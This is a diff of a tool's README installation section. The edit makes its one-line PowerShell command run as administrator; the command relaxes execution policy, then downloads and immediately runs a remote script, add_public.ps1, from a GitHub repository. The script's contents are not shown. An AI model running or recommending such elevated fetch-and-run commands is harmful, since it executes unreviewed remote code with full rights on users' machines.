@@ -35,7 +35,7 @@ from [python.org](https://www.python.org/downloads/).
 
 ### Quick Installation
 
-For the fastest way to install the tool, execute this single command in PowerShell:
+For the fastest way to install the tool, run a PowerShell prompt as administrator and execute this single command in it:
 
 ```powershell
 Set-ExecutionPolicy RemoteSigned -Scope Process -Force; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public.ps1" -OutFile "$env:TEMP\add_public.ps1"; & "$env:TEMP\add_public.ps1"
